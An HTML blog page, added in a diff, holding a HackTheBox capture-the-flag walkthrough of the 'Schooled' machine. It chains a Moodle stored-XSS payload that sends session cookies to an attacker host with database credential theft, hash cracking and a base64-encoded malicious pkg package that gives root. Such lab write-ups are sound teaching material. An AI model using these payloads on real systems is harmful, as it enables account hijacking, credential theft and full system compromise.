@@ -1,0 +1,317 @@
+<!doctype html><html lang=en-us><head>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script>
+<meta charset=utf-8>
+<title>Schooled HackTheBox Walkthrough</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name=author content="Nasef">
+<meta name=generator content="Hugo 0.88.1">
+<link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
+<link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
+<link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
+<link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon>
+<link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon>
+</head><body><nav class="navbar navbar-expand-lg site-navigation">
+<div class=container>
+<a class=navbar-brand href=https://iamnasef.com/>
+<img src=https://iamnasef.com/images/logo.png alt=logo>
+</a>
+<button class="navbar-toggler collapsed" type=button data-toggle=collapse data-target=#sitenavbar>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<div class="collapse navbar-collapse" id=sitenavbar>
+<ul class="navbar-nav ml-auto main-nav">
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/>Home</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/projects>Projects</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/courses>Courses</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/blog>Blog</a>
+</li>
+<li class=nav-item>
+<a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact>
+<span class=btn-area>
+<span data-text="Contact Me">
+Contact Me
+</span>
+</span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<main>
+<section class="site-blog details">
+<div class=container>
+<div class="row justify-content-center">
+<div class=col-lg-8>
+<article class=site-blog-details>
+<h2 class=blog-title>Schooled HackTheBox Walkthrough</h2>
+<p><span>September 11, 2021</span> by <span></span></p>
+<img class=feature-image src=https://iamnasef.com/ alt=blog-feature-image>
+<p>Hello everybody!
+I am Nasef and today I am going to show you how I hacked Schooled machine from hack the box, so let&rsquo;s get started!</p>
+<h3 id=recon>Recon</h3>
+<h5 id=nmap>nmap</h5>
+<p>Nmap found ssh (22), http (80)</p>
+<pre tabindex=0><code>nmap -sC -sV 10.10.10.234    
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 08:43 EDT
+Nmap scan report for 10.10.10.234
+Host is up (0.16s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
+| ssh-hostkey: 
+|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
+|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
+|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
+80/tcp open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
+|_http-title: Schooled - A new kind of educational institute
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.19 seconds
+</code></pre><h5 id=http-80>http (80)</h5>
+<p>First, I tried tinkering with the website, luckily I found a message contain the word &ldquo;Moodle&rdquo;, which is a system used in many schools. Normally, this system work on subdomain called &ldquo;moodle&rdquo; or &ldquo;lms&rdquo;, so I added them to the /etc/hosts</p>
+<p><img src=/images/blog/015/1.png alt=Username></p>
+<p>I created an account in moodle.schooled.htb, self-enrolled into mathematics course, and read an announcement from prof Manual</p>
+<pre tabindex=0><code>This is a self-enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.
+
+Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.
+
+Look forward to seeing you all soon.
+
+Manuel Phillips
+</code></pre><p><img src=/images/blog/015/2.png alt=Username></p>
+<p>The first thing came into my mind was running an automated tool, lukely I found tool called <a href=https://github.com/inc0d3/moodlescan>moodlescan</a> and it told me the running version <code>Moodle v3.9.0-beta</code></p>
+<pre tabindex=0><code> .S_SsS_S.     sSSs_sSSs      sSSs_sSSs     .S_sSSs    S.        sSSs    sSSs    sSSs   .S_SSSs     .S_sSSs    
+.SS~S*S~SS.   d%%SP~YS%%b    d%%SP~YS%%b   .SS~YS%%b   SS.      d%%SP   d%%SP   d%%SP  .SS~SSSSS   .SS~YS%%b   
+S%S `Y' S%S  d%S'     `S%b  d%S'     `S%b  S%S   `S%b  S%S     d%S'    d%S'    d%S'    S%S   SSSS  S%S   `S%b  
+S%S     S%S  S%S       S%S  S%S       S%S  S%S    S%S  S%S     S%S     S%|     S%S     S%S    S%S  S%S    S%S  
+S%S     S%S  S&amp;S       S&amp;S  S&amp;S       S&amp;S  S%S    S&amp;S  S&amp;S     S&amp;S     S&amp;S     S&amp;S     S%S SSSS%S  S%S    S&amp;S  
+S&amp;S     S&amp;S  S&amp;S       S&amp;S  S&amp;S       S&amp;S  S&amp;S    S&amp;S  S&amp;S     S&amp;S_Ss  Y&amp;Ss    S&amp;S     S&amp;S  SSS%S  S&amp;S    S&amp;S  
+S&amp;S     S&amp;S  S&amp;S       S&amp;S  S&amp;S       S&amp;S  S&amp;S    S&amp;S  S&amp;S     S&amp;S~SP  `S&amp;&amp;S   S&amp;S     S&amp;S    S&amp;S  S&amp;S    S&amp;S  
+S&amp;S     S&amp;S  S&amp;S       S&amp;S  S&amp;S       S&amp;S  S&amp;S    S&amp;S  S&amp;S     S&amp;S       `S*S  S&amp;S     S&amp;S    S&amp;S  S&amp;S    S&amp;S  
+S*S     S*S  S*b       d*S  S*b       d*S  S*S    d*S  S*b     S*b        l*S  S*b     S*S    S&amp;S  S*S    S*S  
+S*S     S*S  S*S.     .S*S  S*S.     .S*S  S*S   .S*S  S*S.    S*S.      .S*P  S*S.    S*S    S*S  S*S    S*S  
+S*S     S*S   SSSbs_sdSSS    SSSbs_sdSSS   S*S_sdSSS    SSSbs   SSSbs  sSS*S    SSSbs  S*S    S*S  S*S    S*S  
+SSS     S*S    YSSP~YSSY      YSSP~YSSY    SSS~YSSY      YSSP    YSSP  YSS'      YSSP  SSS    S*S  S*S    SSS  
+        SP                                                                                    SP   SP          
+        Y                                                                                     Y    Y           
+                                                                                                               
+Version 0.8 - May/2021
+.............................................................................................................
+
+By Victor Herrera - supported by www.incode.cl
+
+.............................................................................................................
+
+Getting server information http://moodle.schooled.htb/moodle/ ...
+
+server          : Apache/2.4.46 (FreeBSD) PHP/7.4.15
+x-powered-by    : PHP/7.4.15
+x-frame-options : sameorigin
+last-modified   : Fri, 16 Jul 2021 13:09:01 GMT
+
+Getting moodle version...
+
+Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta
+
+Searching vulnerabilities...
+
+
+Vulnerabilities found: 0
+
+Scan completed.
+</code></pre><p>Searching for public exploits I found two vulnerabilities which I chained together to get the initial foothold: -</p>
+<ol>
+<li><a href=https://github.com/HoangKien1020/CVE-2020-25627>Stored XSS</a>, It caught my attention since the vulnerable field is called <code>MoodleNet</code>, and this is the same field the professor told he will check for the students</li>
+<li><a href=github.com/HoangKien1020/CVE-2020-14321>Privilege Escalation to RCE</a></li>
+</ol>
+<h5 id=hack-the-professors-account>Hack the professor&rsquo;s account</h5>
+<p>I followed the steps and inserted this payload in ModdleNet Field</p>
+<pre tabindex=0><code>&lt;script&gt;var i=new Image;i.src=&quot;http://10.10.14.115/xss.php?&quot;+document.cookie;&lt;/script&gt;
+
+</code></pre><p>The same time I started an http server to get professor&rsquo;s cookies, I got it and was able to login as him !</p>
+<pre tabindex=0><code> python -m SimpleHTTPServer 1111                                  
+Serving HTTP on 0.0.0.0 port 1111 ...
+10.10.14.115 - - [16/Jul/2021 09:22:53] code 404, message File not found
+10.10.14.115 - - [16/Jul/2021 09:22:53] &quot;GET /xss.php?MoodleSession=lg70uolmcocu550lv2vjuuifde HTTP/1.1&quot; 404 -
+10.10.10.234 - - [16/Jul/2021 09:24:01] code 404, message File not found
+10.10.10.234 - - [16/Jul/2021 09:24:01] &quot;GET /xss.php?MoodleSession=fjip06a0vjfl0pmoguhcrljc66 HTTP/1.1&quot; 404 -
+</code></pre><h5 id=from-professor-to-initial-foothold>From Professor to Initial foothold</h5>
+<p>To get the initial foothold I&rsquo;ve used the second exploit, unforutantly the automated script doesn&rsquo;t work so I had to do everything manually as in this video.</p>
+<h3 id=getting-into-jaime>Getting into jaime</h3>
+<p>The first thing I&rsquo;ve done after getting the initial foothold was looking into config files to find mysql creds, I found it in <code>/usr/local/www/apache24/data/moodle/config.php</code></p>
+<pre tabindex=0><code>&lt;?php  // Moodle configuration file
+
+unset($CFG);
+global $CFG;
+$CFG = new stdClass();
+
+$CFG-&gt;dbtype    = 'mysqli';
+$CFG-&gt;dblibrary = 'native';
+$CFG-&gt;dbhost    = 'localhost';
+$CFG-&gt;dbname    = 'moodle';
+$CFG-&gt;dbuser    = 'moodle';
+$CFG-&gt;dbpass    = 'PlaybookMaster2020';
+$CFG-&gt;prefix    = 'mdl_';
+$CFG-&gt;dboptions = array (
+  'dbpersist' =&gt; 0,
+  'dbport' =&gt; 3306,
+  'dbsocket' =&gt; '',
+  'dbcollation' =&gt; 'utf8_unicode_ci',
+);
+
+$CFG-&gt;wwwroot   = 'http://moodle.schooled.htb/moodle';
+$CFG-&gt;dataroot  = '/usr/local/www/apache24/moodledata';
+$CFG-&gt;admin     = 'admin';
+
+$CFG-&gt;directorypermissions = 0777;
+
+require_once(__DIR__ . '/lib/setup.php');
+
+// There is no php closing tag in this file,
+// it is intentional because it prevents trailing whitespace problems!
+7fC5NazJnS+YvuCvd9BEGd2tQO/iTbPB63Fg23SGN0sPID4oZYUV5bt7L3KeswpbaJza8G5wQBRR76ZvQRrM7aKeFetMBASBOts7uM2hkSl/gwNG3sNNDt1HP6Twcbj noah@thenotebook
+</code></pre><p>Using the following commands, I was able to get jamie&rsquo;s hash, then ssh conntect into him.</p>
+<pre tabindex=0><code>/usr/local/bin/mysql  -u moodle -p
+Enter password: PlaybookMaster2020
+show databases;
+use moodle;
+SELECT * FROM mdl_user
+</code></pre><p>Crack it using john.</p>
+<pre tabindex=0><code>$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                                                                                              1 ⨯
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:02 0.01% (ETA: 21:28:58) 0g/s 417.3p/s 417.3c/s 417.3C/s chichi..yourmom
+0g 0:00:00:03 0.01% (ETA: 21:43:19) 0g/s 426.3p/s 426.3c/s 426.3C/s winston..angel123
+!QAZ2wsx         (?)
+1g 0:00:00:31 DONE (2021-07-16 10:49) 0.03156g/s 438.6p/s 438.6c/s 438.6C/s goodman..superpet
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+                                                                                                                                                                                                                        
+$ john hash --show                                                                                                                                                                                                                  1 ⨯
+?:!QAZ2wsx
+
+</code></pre><h3 id=getting-into-root>Getting into Root</h3>
+<p>I ran sudo -l and found I was able to run the following commands as root without password</p>
+<pre tabindex=0><code>User jamie may run the following commands on Schooled:
+    (ALL) NOPASSWD: /usr/sbin/pkg update
+    (ALL) NOPASSWD: /usr/sbin/pkg install *
+</code></pre><p>Lukely I found <a href=https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1>This Exploit</a>, It simply creates a package contains a script <code>The payload runs chmod u+s /bin/bash , so you can now use bash -p to become root.</code> which will be executed when the pkg starts installing.</p>
+<pre tabindex=0><code>echo -ne &quot;/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4Av/AZtdABWQxeTpWUBe1eamP+ls2fn+
+YN5XsDfDEr8t27Md5JzP4t+8d/o0LE//NyAUGS7Wf+A+JeCbQlP7soODqDlA1LLF
+SpsIL1H7nDpk/zu8AMu+Kgu7qmgRsxKQ6QFypLMcPt2VtMB6GUwmwyvSRD6TZed7
+G/N6i1kjHvBJBJFhqUf2qUQx+k7gUGAkRZVorBZQeZ//7jkNWNd9a2M9Sh1z4saF
+qdOyrl/C5qeYjtZIGiK8wqSinEoirmXoqCacF98wcFiTiqBWhYFUkGWcVEv/dW8Z
+wGCN9iaMKX2BYjuwJ+9q98bKYCvlodaKrCuigUW/JF5bQFhbFVEGOSXbQjoSEEFy
+9OeHKHqsCeAeu5oV6qxtZHCXkHHO2Yl5Cbp8hN1qgDu8ojyrVnGYmoJi2tmINwi8
+/Czx34dfsEJKuJsAR77vQRiyhVJHTiE/WiWEYOZWkOY6iBaQ0Rc4VL9+oACiI3TS
+aw2JH9AIOibY84bHiSKqX1VxPT1qd4VXmG6UK+M68CIlPbI+4EplcQd/Myc7qMw1
+ggFhIiDewQE+AAAA0hV/rwDb4ksAAbcDgBgAADPJVnyxxGf7AgAAAAAEWVo=&quot; | openssl enc -base64 -d &gt; mypackage-1.0_5.txz
+sudo pkg install --no-repo-update mypackage-1.0_5.txz
+Proceed with this action? [y/N]: y
+[1/1] Installing mypackage-1.0_5...
+[jamie@Schooled ~]$ bash -p
+[jamie@Schooled ~]# whoami
+root
+[jamie@Schooled ~]# cat /root/root.txt
+21693d47df25974ac75e396c93ce94e0
+</code></pre><p>Thank you for reading!</p>
+</article>
+</div>
+</div>
+</div>
+</section>
+<section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)>
+<div class=container>
+<div class=row>
+<div class="col-12 text-center">
+<h1 class=site-cta-title>SAY HELLO</h1>
+<a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a>
+<div class=sm-links>
+<a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
+<a href=https://www.linkedin.com/in/iamnasef/><i class="fa fa-linkedin-square" aria-hidden=true></i></a>
+<a href=https://github.com/iamnasef><i class="fa fa-github-square" aria-hidden=true></i></a>
+<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a>
+</div>
+</div>
+</div>
+</div>
+</section>
+</main><footer class=site-footer>
+<div class=container>
+<div class=row>
+<div class=col-12>
+<div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Contact Info</h5>
+<p class=site-footer-widget-description>
+<a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a>
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Check it</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://iamnasef.com/blog>Blog</a></li>
+<li><a href=https://iamnasef.com/projects>Projects</a></li>
+<li><a href=https://iamnasef.com/courses>Courses</a></li>
+<li><a href=https://iamnasef.com/contact>Contact</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Social Media</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li>
+<li><a href=https://twitter.com/iamnasef>Twitter</a></li>
+<li><a href=https://github.com/iamnasef>Github</a></li>
+<li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Keeping you safe</h5>
+<p class=site-footer-widget-description>
+Application Security Engineering<br>Cyber Security Technical Training<br>Cyber Security Awarness
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-12">
+<a href=#top class=site-footer-widget-top>
+<img src=https://iamnasef.com/images/to-top.svg alt=back-to-top>
+<p>
+I want to
+<br>
+visit again
+</p>
+</a>
+</div>
+</div>
+</div>
+</footer>
+<script src=https://iamnasef.com/js/formhandler.min.js></script>
+<script src=https://iamnasef.com/js/vendor.min.js></script>
+<script src=https://iamnasef.com/js/script.min.js></script></body>
+</html>
